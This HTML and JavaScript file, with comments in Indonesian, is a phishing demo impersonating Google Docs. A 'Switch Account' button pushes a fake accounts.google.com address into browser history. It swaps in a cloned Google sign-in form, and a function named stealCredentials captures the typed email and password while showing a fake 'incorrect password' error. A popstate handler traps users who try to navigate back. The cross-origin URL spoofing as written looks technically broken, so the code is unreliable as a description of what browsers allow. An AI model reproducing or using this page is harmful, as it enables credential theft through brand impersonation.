<!DOCTYPE html>
<html>
<head>
    <title>Google Docs</title>
    <style>
        body { margin: 0; font-family: Arial; }
        .fake-url-bar {
            background: #f1f1f1;
            padding: 10px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #ddd;
        }
        .url-display {
            flex-grow: 1;
            background: white;
            padding: 8px;
            margin: 0 10px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 14px;
        }
    </style>
</head>
<body>

<div class="fake-url-bar">
    <button onclick="history.back()">‚Üê</button>
    <button onclick="history.forward()">‚Üí</button>
    <div class="url-display" id="urlDisplay">https://docs.google.com/document/</div>
    <button onclick="reloadPage()">‚Üª</button>
</div>

<div style="padding: 30px;">
    <h1>üìÑ Google Docs - Important Document</h1>
    <p>Edit your document below:</p>
    
    <textarea id="docContent" style="width:100%;height:200px;padding:15px;">
Confidential Company Information:
- Project Code: ALPHA-7
- Budget: $2.5M
- Launch Date: 2024-06-15
- Client: TechCorp Inc.
    </textarea>
    
    <div style="margin-top: 20px;">
        <button onclick="saveDocument()" style="background:#34a853;color:white;padding:10px 20px;border:none;">
            üíæ Save to Google Drive
        </button>
        <button onclick="showLogin()" style="background:#1a73e8;color:white;padding:10px 20px;border:none;margin-left:10px;">
            üë§ Switch Account
        </button>
    </div>
</div>

<script>
// Simpan URL asli
const originalURL = 'https://docs.google.com/document/';
let isAttackMode = false;

// Update URL display
function updateURLDisplay() {
    document.getElementById('urlDisplay').textContent = window.location.href;
}

// Attack: Ganti ke login page
function showLogin() {
    isAttackMode = true;
    
    // 1. Push state dengan URL Google Accounts
    history.pushState(
        { page: 'login', source: 'docs' },
        'Google Accounts',
        'https://accounts.google.com/signin'
    );
    
    // 2. Ganti konten (tapi URL tetap menunjukkan Google)
    document.body.innerHTML = `
        <div style="text-align:center;padding:40px;">
            <div style="font-size:48px;color:#4285f4;margin-bottom:20px;">G</div>
            <h2>Sign in</h2>
            <p style="color:#666;">to continue to Google Docs</p>
            
            <div style="max-width:400px;margin:30px auto;">
                <input type="email" placeholder="Email or phone" 
                       id="emailInput"
                       style="width:100%;padding:12px;margin-bottom:15px;border:1px solid #ddd;border-radius:4px;">
                
                <input type="password" placeholder="Enter your password"
                       id="passwordInput" 
                       style="width:100%;padding:12px;margin-bottom:20px;border:1px solid #ddd;border-radius:4px;">
                
                <button onclick="stealCredentials()"
                        style="width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;">
                    Next
                </button>
                
                <p style="font-size:12px;color:#666;margin-top:20px;">
                    Not your computer? Use Guest mode to sign in privately.
                </p>
            </div>
            
            <button onclick="goBackToDocs()"
                    style="position:fixed;top:20px;right:20px;padding:8px 16px;background:#f1f1f1;border:1px solid #ddd;">
                ‚Üê Back to Docs
            </button>
        </div>
    `;
    
    updateURLDisplay();
}

function stealCredentials() {
    const email = document.getElementById('emailInput')?.value || '';
    const password = document.getElementById('passwordInput')?.value || '';
    
    console.log('üìß Credentials captured:', { email, password });
    
    // Simpan ke localStorage (simulasi pengiriman ke server)
    const stolenData = {
        email: email,
        password: password,
        timestamp: new Date().toISOString(),
        source: 'history_poisoning_attack'
    };
    
    localStorage.setItem('stolen_creds', JSON.stringify(stolenData));
    
    alert('‚ùå Incorrect password. Please try again.');
    
    // Clear inputs
    if(document.getElementById('emailInput')) {
        document.getElementById('emailInput').value = '';
    }
    if(document.getElementById('passwordInput')) {
        document.getElementById('passwordInput').value = '';
    }
}

function goBackToDocs() {
    // Kembali ke state sebelumnya
    history.back();
    isAttackMode = false;
    
    // Reload konten asli
    document.body.innerHTML = document.body.innerHTML; // Reset
    updateURLDisplay();
}

// Trap back/forward navigation
window.onpopstate = function(event) {
    console.log('Navigation terjadi:', event.state);
    
    if(isAttackMode && event.state && event.state.page === 'login') {
        // User mencoba keluar dari login page
        // Push state lagi untuk keep them trapped
        history.pushState(
            { page: 'login', trapped: true },
            'Google Accounts',
            'https://accounts.google.com/signin'
        );
        
        alert('‚ö†Ô∏è Please sign in to save your document changes!');
    }
};

// Update URL display secara real-time
setInterval(updateURLDisplay, 100);
updateURLDisplay();
</script>

</body>
</html>